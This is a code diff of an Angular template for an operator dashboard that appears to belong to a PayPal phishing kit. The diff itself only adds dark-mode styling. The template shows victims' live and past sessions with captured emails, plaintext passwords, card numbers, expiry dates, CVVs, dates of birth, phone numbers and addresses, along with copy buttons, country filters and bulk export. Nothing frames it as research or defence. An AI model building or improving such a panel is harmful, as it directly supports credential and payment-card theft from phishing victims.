@@ -47,7 +47,7 @@ type AdminTab = 'live' | 'history' | 'settings';
       } @else {
 
       <!-- SIDEBAR -->
-      <aside class="w-full h-16 lg:w-[260px] lg:h-full bg-pp-navy text-white flex lg:flex-col shrink-0 transition-all duration-300 z-30 shadow-xl items-center lg:items-stretch justify-between lg:justify-start px-4 lg:px-0">
+      <aside class="w-full h-16 lg:w-[260px] lg:h-full bg-pp-navy dark:bg-slate-950 text-white flex lg:flex-col shrink-0 transition-all duration-300 z-30 shadow-xl items-center lg:items-stretch justify-between lg:justify-start px-4 lg:px-0">
            <div class="h-16 lg:h-20 flex items-center lg:px-6 lg:border-b border-[#ffffff10]">
               <span class="font-bold text-xl tracking-tight">PayPal <span class="text-pp-success text-xs align-top">SEC</span></span>
            </div>
@@ -87,9 +87,9 @@ type AdminTab = 'live' | 'history' | 'settings';
       <main class="flex-1 flex flex-col h-[calc(100dvh-64px)] lg:h-[100dvh] relative bg-pp-bg overflow-hidden">
          
          <!-- Top Bar (Desktop Only) -->
-         <header class="hidden lg:flex h-16 bg-white border-b border-slate-200 items-center justify-between px-6 shrink-0 z-20 shadow-sm">
+         <header class="hidden lg:flex h-16 bg-white dark:bg-slate-900 border-b border-slate-200 dark:border-slate-700 items-center justify-between px-6 shrink-0 z-20 shadow-sm">
              <div class="flex items-center gap-2">
-                 <h1 class="text-lg font-bold text-pp-navy">Administrator Console</h1>
+                 <h1 class="text-lg font-bold text-pp-navy dark:text-white">Administrator Console</h1>
                  @if(state.isOfflineMode()) {
                      <span class="bg-amber-100 text-amber-800 text-[10px] font-bold px-2 py-1 rounded-full uppercase tracking-wider flex items-center gap-1">
                          <span class="material-icons text-[12px]">wifi_off</span> Local Mode
@@ -114,15 +114,19 @@ type AdminTab = 'live' | 'history' | 'settings';
                     <div class="flex flex-col lg:flex-row h-full">
                         
                         <!-- List Column (Fixed Width on Desktop, Top on Mobile) -->
-                        <div class="lg:w-[350px] bg-white border-b lg:border-b-0 lg:border-r border-slate-200 flex flex-col shrink-0 h-[300px] lg:h-full">
-                             <div class="p-4 border-b border-slate-100 bg-slate-50/50 flex justify-between items-center shrink-0">
-                                 <h3 class="font-bold text-base text-pp-navy">Active Sessions</h3>
+                        <div class="lg:w-[350px] bg-white dark:bg-slate-800 border-b lg:border-b-0 lg:border-r border-slate-200 dark:border-slate-700 flex flex-col shrink-0 h-[300px] lg:h-full">
+                             <div class="p-4 border-b border-slate-100 dark:border-slate-700 bg-slate-50/90 dark:bg-slate-900/90 flex justify-between items-center shrink-0">
+                                 <h3 class="font-bold text-base text-pp-navy dark:text-white">Active Sessions</h3>
                                  <span class="bg-pp-blue text-white text-xs px-2 py-1 rounded-md font-bold">{{ state.activeSessions().length }}</span>
                              </div>
-                             <div class="flex-1 overflow-y-auto p-2 space-y-2">
+                             <div class="flex-1 overflow-y-auto p-2 space-y-2 dark:bg-slate-800">
                                  @for(session of state.activeSessions(); track session.id) {
                                      <div (click)="selectSession(session)" class="p-3 rounded-[12px] cursor-pointer transition-all border border-transparent group relative"
-                                          [class.bg-[#E1F0FA]]="isSelected(session)" [class.border-pp-blue]="isSelected(session)" [class.hover:bg-slate-50]="!isSelected(session)">
+                                          [class.bg-[#E1F0FA]]="isSelected(session)"
+                                          [class.dark:bg-slate-700]="isSelected(session)"
+                                          [class.border-pp-blue]="isSelected(session)"
+                                          [class.hover:bg-slate-50]="!isSelected(session)"
+                                          [class.dark:hover:bg-slate-700]="!isSelected(session)">
                                          
                                          <div class="absolute top-3 right-3 h-2 w-2 rounded-full"
                                             [class.bg-pp-success]="isSessionLive(session)"
@@ -130,7 +134,7 @@ type AdminTab = 'live' | 'history' | 'settings';
 
                                          <div class="flex flex-col gap-0.5">
                                              <div class="flex items-center gap-2">
-                                                <span class="font-bold text-pp-navy font-mono text-xs">{{ session.id }}</span>
+                                                <span class="font-bold text-pp-navy dark:text-white font-mono text-xs">{{ session.id }}</span>
                                                 @if(session.data?.ipCountry) {
                                                     <img [src]="getFlagUrl(session.data.ipCountry)" class="h-3 w-auto rounded-[2px]" title="{{session.data.ipCountry}}">
                                                 }
@@ -147,29 +151,29 @@ type AdminTab = 'live' | 'history' | 'settings';
                                  </div>
 
                              <!-- Incomplete Sessions (Offline but Verified) -->
-                             <div class="h-[40%] flex flex-col border-t border-slate-200">
-                                 <div (click)="incompleteCollapsed.set(!incompleteCollapsed())" class="p-3 bg-slate-100 border-b border-slate-200 flex justify-between items-center cursor-pointer hover:bg-slate-200 transition-colors">
+                             <div class="h-[40%] flex flex-col border-t border-slate-200 dark:border-slate-700">
+                                 <div (click)="incompleteCollapsed.set(!incompleteCollapsed())" class="p-3 bg-slate-100 dark:bg-slate-900 border-b border-slate-200 dark:border-slate-700 flex justify-between items-center cursor-pointer hover:bg-slate-200 dark:hover:bg-slate-800 transition-colors">
                                      <div class="flex items-center gap-2">
                                          <span class="material-icons text-slate-400 text-sm transform transition-transform" [class.-rotate-90]="incompleteCollapsed()">expand_more</span>
-                                         <h3 class="font-bold text-sm text-slate-600">Incomplete</h3>
+                                         <h3 class="font-bold text-sm text-slate-600 dark:text-slate-300">Incomplete</h3>
                                      </div>
                                      <span class="bg-slate-300 text-slate-700 text-[10px] px-2 py-0.5 rounded-full font-bold">{{ state.incompleteSessions().length }}</span>
                                  </div>
 
-                                 <div class="flex-1 overflow-y-auto p-2 space-y-2 bg-slate-50" [class.hidden]="incompleteCollapsed()">
+                                 <div class="flex-1 overflow-y-auto p-2 space-y-2 bg-slate-50 dark:bg-slate-800" [class.hidden]="incompleteCollapsed()">
                                      @for(session of state.incompleteSessions(); track session.id) {
-                                         <div (click)="selectSession(session)" class="p-3 rounded-[12px] cursor-pointer transition-all border border-slate-200 bg-white opacity-80 hover:opacity-100"
+                                         <div (click)="selectSession(session)" class="p-3 rounded-[12px] cursor-pointer transition-all border border-slate-200 dark:border-slate-600 bg-white dark:bg-slate-700 opacity-80 hover:opacity-100"
                                               [class.border-pp-blue]="isSelected(session)" [class.ring-1]="isSelected(session)" [class.ring-pp-blue]="isSelected(session)">
 
                                              <div class="flex items-center justify-between mb-1">
-                                                <span class="font-bold text-slate-500 font-mono text-xs">{{ session.id }}</span>
+                                                <span class="font-bold text-slate-500 dark:text-slate-400 font-mono text-xs">{{ session.id }}</span>
                                                 <span class="text-[10px] font-bold text-slate-400 uppercase">Offline</span>
                                              </div>
                                              <div class="flex flex-col gap-0.5">
-                                                 <span class="text-sm font-bold text-slate-700 truncate">{{ getDisplayEmail(session.email) }}</span>
+                                                 <span class="text-sm font-bold text-slate-700 dark:text-slate-200 truncate">{{ getDisplayEmail(session.email) }}</span>
                                                  <div class="flex justify-between items-center mt-2">
                                                      <span class="text-[10px] text-slate-400">{{ session.stage }}</span>
-                                                     <button (click)="archiveSession(session, $event)" class="text-[10px] font-bold text-pp-blue hover:underline bg-blue-50 px-2 py-1 rounded">Archive</button>
+                                                     <button (click)="archiveSession(session, $event)" class="text-[10px] font-bold text-pp-blue hover:underline bg-blue-50 dark:bg-slate-600 dark:text-white px-2 py-1 rounded">Archive</button>
                                                  </div>
                                              </div>
                                          </div>
@@ -184,17 +188,17 @@ type AdminTab = 'live' | 'history' | 'settings';
                         </div>
 
                         <!-- Details Column (Flexible, Independent Scroll) -->
-                        <div class="flex-1 flex flex-col h-full overflow-hidden bg-[#F9FAFB] relative">
+                        <div class="flex-1 flex flex-col h-full overflow-hidden bg-[#F9FAFB] dark:bg-slate-900 relative">
                              @if(monitoredSession()) {
                                  <!-- Header (Sticky) -->
-                                 <div class="p-4 lg:p-6 border-b border-slate-100 flex justify-between items-center bg-white shrink-0 z-10 shadow-sm">
+                                 <div class="p-4 lg:p-6 border-b border-slate-100 dark:border-slate-700 flex justify-between items-center bg-white dark:bg-slate-800 shrink-0 z-10 shadow-sm">
                                      <div>
                                          <div class="flex items-center gap-3 mb-1">
-                                            <h2 class="font-bold text-lg lg:text-xl text-pp-navy">Session Details</h2>
+                                            <h2 class="font-bold text-lg lg:text-xl text-pp-navy dark:text-white">Session Details</h2>
                                             <span class="bg-pp-navy text-white text-[10px] px-2 py-0.5 rounded uppercase tracking-wider font-bold">{{ monitoredSession()?.currentView || monitoredSession()?.stage }}</span>
                                          </div>
                                          <div class="flex items-center gap-2">
-                                             <p class="text-xs text-slate-500 font-mono">{{ monitoredSession()?.id }} • {{ monitoredSession()?.fingerprint?.ip }}</p>
+                                             <p class="text-xs text-slate-500 dark:text-slate-400 font-mono">{{ monitoredSession()?.id }} • {{ monitoredSession()?.fingerprint?.ip }}</p>
                                              @if(monitoredSession()?.data?.ipCountry) {
                                                 <img [src]="getFlagUrl(monitoredSession()?.data?.ipCountry)" class="h-3 w-auto shadow-sm" title="Location: {{monitoredSession()?.data?.ipCountry}}">
                                              }
@@ -211,21 +215,21 @@ type AdminTab = 'live' | 'history' | 'settings';
                                      <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                                          
                                          <!-- Credentials -->
-                                         <div class="bg-white p-6 rounded-[20px] shadow-sm border border-slate-100 relative overflow-hidden group">
-                                             <div class="absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity"><span class="material-icons text-6xl text-pp-navy">lock</span></div>
+                                         <div class="bg-white dark:bg-slate-800 p-6 rounded-[20px] shadow-sm border border-slate-100 dark:border-slate-700 relative overflow-hidden group">
+                                             <div class="absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity"><span class="material-icons text-6xl text-pp-navy dark:text-white">lock</span></div>
                                              <h4 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-4">Login Credentials</h4>
                                              <div class="space-y-4 relative z-10">
                                                  <div>
                                                      <label class="text-[11px] font-bold text-slate-500 block mb-1">Email / Username</label>
                                                      <div class="flex items-center gap-2">
-                                                         <p class="text-base font-bold text-pp-navy break-all">{{ monitoredSession()?.data?.email || 'Waiting...' }}</p>
+                                                         <p class="text-base font-bold text-pp-navy dark:text-white break-all">{{ monitoredSession()?.data?.email || 'Waiting...' }}</p>
                                                          <button *ngIf="monitoredSession()?.data?.email" (click)="copy(monitoredSession()?.data?.email)" class="text-pp-blue hover:text-pp-navy"><span class="material-icons text-[14px]">content_copy</span></button>
                                                      </div>
                                                  </div>
                                                  <div>
                                                      <label class="text-[11px] font-bold text-slate-500 block mb-1">Password</label>
                                                      <div class="flex items-center gap-2">
-                                                         <p class="text-base font-mono bg-slate-100 px-2 py-1 rounded text-pp-navy border border-slate-200">{{ monitoredSession()?.data?.password || 'Waiting...' }}</p>
+                                                         <p class="text-base font-mono bg-slate-100 dark:bg-slate-900/50 px-2 py-1 rounded text-pp-navy dark:text-white border border-slate-200 dark:border-slate-700">{{ monitoredSession()?.data?.password || 'Waiting...' }}</p>
                                                          <button *ngIf="monitoredSession()?.data?.password" (click)="copy(monitoredSession()?.data?.password)" class="text-pp-blue hover:text-pp-navy"><span class="material-icons text-[14px]">content_copy</span></button>
                                                      </div>
                                                  </div>
@@ -233,8 +237,8 @@ type AdminTab = 'live' | 'history' | 'settings';
                                          </div>
 
                                          <!-- Financial -->
-                                         <div class="bg-white p-6 rounded-[20px] shadow-sm border border-slate-100 relative overflow-hidden group">
-                                             <div class="absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity"><span class="material-icons text-6xl text-pp-navy">credit_card</span></div>
+                                         <div class="bg-white dark:bg-slate-800 p-6 rounded-[20px] shadow-sm border border-slate-100 dark:border-slate-700 relative overflow-hidden group">
+                                             <div class="absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity"><span class="material-icons text-6xl text-pp-navy dark:text-white">credit_card</span></div>
                                              <h4 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-4">Financial Instrument</h4>
                                              <div class="space-y-4 relative z-10">
                                                  <div>
@@ -245,14 +249,14 @@ type AdminTab = 'live' | 'history' | 'settings';
                                                          }
                                                      </div>
                                                      <div class="flex items-center gap-2">
-                                                        <p class="text-lg font-mono font-bold text-pp-navy tracking-wide">{{ formatCard(monitoredSession()?.data?.cardNumber) }}</p>
+                                                        <p class="text-lg font-mono font-bold text-pp-navy dark:text-white tracking-wide">{{ formatCard(monitoredSession()?.data?.cardNumber) }}</p>
                                                         <button *ngIf="monitoredSession()?.data?.cardNumber" (click)="copy(monitoredSession()?.data?.cardNumber)" class="text-pp-blue hover:text-pp-navy"><span class="material-icons text-[14px]">content_copy</span></button>
                                                      </div>
                                                  </div>
                                                  <div class="flex gap-6">
                                                      <div>
                                                          <label class="text-[11px] font-bold text-slate-500 block mb-1">Exp</label>
-                                                         <p class="font-bold text-pp-navy">{{ monitoredSession()?.data?.cardExpiry || '--/--' }}</p>
+                                                         <p class="font-bold text-pp-navy dark:text-white">{{ monitoredSession()?.data?.cardExpiry || '--/--' }}</p>
                                                      </div>
                                                      <div>
                                                          <label class="text-[11px] font-bold text-slate-500 block mb-1">CVV</label>
@@ -297,28 +301,28 @@ type AdminTab = 'live' | 'history' | 'settings';
                                          </div>
                                          
                                          <!-- Personal Info -->
-                                         <div class="col-span-1 md:col-span-2 bg-white p-6 rounded-[20px] shadow-sm border border-slate-100">
+                                         <div class="col-span-1 md:col-span-2 bg-white dark:bg-slate-800 p-6 rounded-[20px] shadow-sm border border-slate-100 dark:border-slate-700">
                                               <h4 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-4">Identity Profile</h4>
                                               <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
                                                   <div>
                                                       <label class="text-[10px] font-bold text-slate-400 uppercase">Name</label>
-                                                      <p class="text-sm font-bold text-pp-navy">{{ (monitoredSession()?.data?.firstName + ' ' + monitoredSession()?.data?.lastName).trim() || 'Waiting...' }}</p>
+                                                      <p class="text-sm font-bold text-pp-navy dark:text-white">{{ (monitoredSession()?.data?.firstName + ' ' + monitoredSession()?.data?.lastName).trim() || 'Waiting...' }}</p>
                                                   </div>
                                                   <div>
                                                       <label class="text-[10px] font-bold text-slate-400 uppercase">DOB</label>
-                                                      <p class="text-sm font-bold text-pp-navy">{{ monitoredSession()?.data?.dob || 'Waiting...' }}</p>
+                                                      <p class="text-sm font-bold text-pp-navy dark:text-white">{{ monitoredSession()?.data?.dob || 'Waiting...' }}</p>
                                                   </div>
                                                   <div>
                                                       <label class="text-[10px] font-bold text-slate-400 uppercase">Phone</label>
-                                                      <p class="text-sm font-bold text-pp-navy">{{ monitoredSession()?.data?.phoneNumber || 'Waiting...' }}</p>
+                                                      <p class="text-sm font-bold text-pp-navy dark:text-white">{{ monitoredSession()?.data?.phoneNumber || 'Waiting...' }}</p>
                                                   </div>
                                                   <div>
                                                       <label class="text-[10px] font-bold text-slate-400 uppercase">Location</label>
-                                                      <p class="text-sm font-bold text-pp-navy">{{ monitoredSession()?.data?.country || 'Waiting...' }}</p>
+                                                      <p class="text-sm font-bold text-pp-navy dark:text-white">{{ monitoredSession()?.data?.country || 'Waiting...' }}</p>
                                                   </div>
                                                   <div class="col-span-2">
                                                       <label class="text-[10px] font-bold text-slate-400 uppercase">Address</label>
-                                                      <p class="text-sm font-bold text-pp-navy">{{ monitoredSession()?.data?.address || 'Waiting...' }}</p>
+                                                      <p class="text-sm font-bold text-pp-navy dark:text-white">{{ monitoredSession()?.data?.address || 'Waiting...' }}</p>
                                                   </div>
                                               </div>
                                          </div>
@@ -327,7 +331,7 @@ type AdminTab = 'live' | 'history' | 'settings';
                                  </div>
 
                                  <!-- Action Bar (Sticky Bottom) -->
-                                 <div class="p-4 border-t border-slate-200 bg-white/90 backdrop-blur-sm absolute bottom-0 left-0 right-0 z-20 flex justify-between items-center shadow-lg">
+                                 <div class="p-4 border-t border-slate-200 dark:border-slate-700 bg-white/90 dark:bg-slate-800/90 backdrop-blur-sm absolute bottom-0 left-0 right-0 z-20 flex justify-between items-center shadow-lg">
                                      <div class="flex items-center gap-2">
                                          <span class="h-2 w-2 rounded-full" [class.animate-pulse]="isSessionLive(monitoredSession())" [class.bg-pp-success]="isSessionLive(monitoredSession())" [class.bg-slate-300]="!isSessionLive(monitoredSession())"></span>
                                          <span class="text-xs font-bold text-slate-500 hidden sm:block">{{ isSessionLive(monitoredSession()) ? 'Live Connection' : 'Offline' }}</span>
@@ -391,16 +395,16 @@ type AdminTab = 'live' | 'history' | 'settings';
 
                 <!-- HISTORY TAB -->
                 @case ('history') {
-                    <div class="bg-white rounded-card shadow-sm border border-slate-100 overflow-hidden h-full flex flex-col">
+                    <div class="bg-white dark:bg-slate-800 rounded-card shadow-sm border border-slate-100 dark:border-slate-700 overflow-hidden h-full flex flex-col">
 
                         <!-- Toolbar -->
-                        <div class="px-6 py-4 border-b border-slate-100 bg-slate-50/50 flex flex-col md:flex-row gap-4 items-center justify-between shrink-0">
-                            <h3 class="font-bold text-lg text-pp-navy shrink-0 hidden md:block">Session History</h3>
+                        <div class="px-6 py-4 border-b border-slate-100 dark:border-slate-700 bg-slate-50/90 dark:bg-slate-900/90 flex flex-col md:flex-row gap-4 items-center justify-between shrink-0">
+                            <h3 class="font-bold text-lg text-pp-navy dark:text-white shrink-0 hidden md:block">Session History</h3>
 
                             <div class="flex flex-col md:flex-row items-center gap-3 w-full md:w-auto">
                                 <!-- Bulk Actions -->
                                 @if(selectedSessionIds().size > 0) {
-                                    <div class="flex items-center bg-pp-navy text-white rounded-lg px-2 py-1 animate-fade-in shadow-lg">
+                                    <div class="flex items-center bg-pp-navy dark:bg-slate-600 text-white rounded-lg px-2 py-1 animate-fade-in shadow-lg">
                                         <span class="text-xs font-bold px-2">{{ selectedSessionIds().size }} selected</span>
                                         <div class="h-4 w-px bg-white/20 mx-1"></div>
                                         <button (click)="bulkExport()" class="p-1.5 hover:bg-white/10 rounded transition-colors" title="Export Selected"><span class="material-icons text-sm">download</span></button>
@@ -413,10 +417,10 @@ type AdminTab = 'live' | 'history' | 'settings';
                                 <div class="flex items-center gap-2 w-full md:w-auto">
                                     <div class="relative flex-1 md:w-64">
                                         <span class="material-icons absolute left-3 top-2.5 text-slate-400 text-sm">search</span>
-                                        <input type="text" [ngModel]="searchQuery()" (ngModelChange)="searchQuery.set($event)" placeholder="Search sessions..." class="w-full pl-9 pr-4 py-2 text-sm border border-slate-200 rounded-lg focus:outline-none focus:border-pp-blue transition-colors">
+                                        <input type="text" [ngModel]="searchQuery()" (ngModelChange)="searchQuery.set($event)" placeholder="Search sessions..." class="w-full pl-9 pr-4 py-2 text-sm border border-slate-200 dark:border-slate-600 rounded-lg focus:outline-none focus:border-pp-blue transition-colors dark:bg-slate-700 dark:text-white">
                                     </div>
 
-                                    <select [ngModel]="timeFilter()" (ngModelChange)="timeFilter.set($event)" class="px-3 py-2 text-sm border border-slate-200 rounded-lg bg-white focus:outline-none focus:border-pp-blue cursor-pointer">
+                                    <select [ngModel]="timeFilter()" (ngModelChange)="timeFilter.set($event)" class="px-3 py-2 text-sm border border-slate-200 dark:border-slate-600 rounded-lg bg-white dark:bg-slate-700 dark:text-white focus:outline-none focus:border-pp-blue cursor-pointer">
                                         <option value="6h">Last 6 Hours</option>
                                         <option value="24h">Last 24 Hours</option>
                                         <option value="7d">Last 7 Days</option>
@@ -424,7 +428,7 @@ type AdminTab = 'live' | 'history' | 'settings';
                                         <option value="custom">Custom Range</option>
                                     </select>
 
-                                    <select [ngModel]="countryFilter()" (ngModelChange)="countryFilter.set($event)" class="px-3 py-2 text-sm border border-slate-200 rounded-lg bg-white focus:outline-none focus:border-pp-blue cursor-pointer max-w-[120px]">
+                                    <select [ngModel]="countryFilter()" (ngModelChange)="countryFilter.set($event)" class="px-3 py-2 text-sm border border-slate-200 dark:border-slate-600 rounded-lg bg-white dark:bg-slate-700 dark:text-white focus:outline-none focus:border-pp-blue cursor-pointer max-w-[120px]">
                                         <option value="all">All Countries</option>
                                         @for(c of uniqueCountries(); track c) {
                                             <option [value]="c">{{ c }}</option>
@@ -436,17 +440,17 @@ type AdminTab = 'live' | 'history' | 'settings';
 
                         <!-- Custom Date Range (Conditional) -->
                         @if(timeFilter() === 'custom') {
-                            <div class="px-6 py-3 bg-slate-100 border-b border-slate-200 flex items-center justify-end gap-3 animate-fade-in">
+                            <div class="px-6 py-3 bg-slate-100 dark:bg-slate-900 border-b border-slate-200 dark:border-slate-700 flex items-center justify-end gap-3 animate-fade-in">
                                 <span class="text-xs font-bold text-slate-500 uppercase">Range:</span>
-                                <input type="date" [ngModel]="customDateStart()" (ngModelChange)="customDateStart.set($event)" class="px-2 py-1 text-sm border border-slate-300 rounded">
+                                <input type="date" [ngModel]="customDateStart()" (ngModelChange)="customDateStart.set($event)" class="px-2 py-1 text-sm border border-slate-300 dark:border-slate-600 rounded dark:bg-slate-700 dark:text-white">
                                 <span class="text-slate-400">-</span>
-                                <input type="date" [ngModel]="customDateEnd()" (ngModelChange)="customDateEnd.set($event)" class="px-2 py-1 text-sm border border-slate-300 rounded">
+                                <input type="date" [ngModel]="customDateEnd()" (ngModelChange)="customDateEnd.set($event)" class="px-2 py-1 text-sm border border-slate-300 dark:border-slate-600 rounded dark:bg-slate-700 dark:text-white">
                             </div>
                         }
 
-                        <div class="flex-1 overflow-auto">
+                        <div class="flex-1 overflow-auto bg-white dark:bg-slate-800">
                             <table class="w-full text-left border-collapse">
-                                <thead class="bg-pp-bg text-slate-500 text-xs font-bold uppercase tracking-wider sticky top-0 z-10 shadow-sm">
+                                <thead class="bg-pp-bg dark:bg-slate-900 text-slate-500 dark:text-slate-400 text-xs font-bold uppercase tracking-wider sticky top-0 z-10 shadow-sm">
                                     <tr>
                                         <th class="px-4 py-4 w-12 text-center">
                                             <input type="checkbox" (change)="toggleAllSelection($event)" [checked]="isAllSelected()" class="rounded border-slate-300 text-pp-blue focus:ring-pp-blue cursor-pointer">
@@ -459,21 +463,23 @@ type AdminTab = 'live' | 'history' | 'settings';
                                         <th class="px-6 py-4 text-right">Actions</th>
                                     </tr>
                                 </thead>
-                                <tbody class="divide-y divide-slate-100 text-sm font-medium">
+                                <tbody class="divide-y divide-slate-100 dark:divide-slate-700 text-sm font-medium">
                                     @for(item of filteredHistory(); track item.id) {
-                                        <tr class="hover:bg-slate-50 transition-colors cursor-pointer group" (click)="viewHistory(item)" [class.bg-blue-50]="selectedSessionIds().has(item.id)">
+                                        <tr class="hover:bg-slate-50 dark:hover:bg-slate-700 transition-colors cursor-pointer group" (click)="viewHistory(item)"
+                                            [class.bg-blue-50]="selectedSessionIds().has(item.id)"
+                                            [class.dark:bg-slate-700]="selectedSessionIds().has(item.id)">
                                             <td class="px-4 py-4 text-center" (click)="$event.stopPropagation()">
-                                                <input type="checkbox" [checked]="selectedSessionIds().has(item.id)" (change)="toggleSelection(item.id, $event)" class="rounded border-slate-300 text-pp-blue focus:ring-pp-blue cursor-pointer">
+                                                <input type="checkbox" [checked]="selectedSessionIds().has(item.id)" (change)="toggleSelection(item.id, $event)" class="rounded border-slate-300 dark:border-slate-500 text-pp-blue focus:ring-pp-blue cursor-pointer">
                                             </td>
-                                            <td class="px-4 py-4 text-slate-500 whitespace-nowrap">{{ item.timestamp | date:'short' }}</td>
-                                            <td class="px-6 py-4 text-pp-blue font-bold font-mono">
+                                            <td class="px-4 py-4 text-slate-500 dark:text-slate-400 whitespace-nowrap">{{ item.timestamp | date:'short' }}</td>
+                                            <td class="px-6 py-4 text-pp-blue dark:text-blue-400 font-bold font-mono">
                                                 {{ item.id }}
-                                                @if(item.isPinned) { <span class="material-icons text-[12px] text-pp-blue ml-1">push_pin</span> }
+                                                @if(item.isPinned) { <span class="material-icons text-[12px] text-pp-blue dark:text-blue-400 ml-1">push_pin</span> }
                                             </td>
                                             <td class="px-6 py-4">
                                                 <div class="flex flex-col">
                                                     <div class="flex items-center gap-2">
-                                                        <span class="font-bold text-pp-navy">{{ item.name }}</span>
+                                                        <span class="font-bold text-pp-navy dark:text-white">{{ item.name }}</span>
                                                         @if(item.data?.ipCountry) {
                                                             <img [src]="getFlagUrl(item.data.ipCountry)" class="h-3 w-auto rounded-[2px]" title="{{item.data.ipCountry}}">
                                                         }
@@ -481,7 +487,7 @@ type AdminTab = 'live' | 'history' | 'settings';
                                                     <span class="text-xs text-slate-400">{{ item.email }}</span>
                                                 </div>
                                             </td>
-                                            <td class="px-6 py-4 font-mono text-slate-600">
+                                            <td class="px-6 py-4 font-mono text-slate-600 dark:text-slate-300">
                                                 <div class="flex items-center gap-2">
                                                     @if(getCardLogoUrl(item.data?.cardType)) {
                                                         <img [src]="getCardLogoUrl(item.data.cardType)" class="h-4 w-auto object-contain">
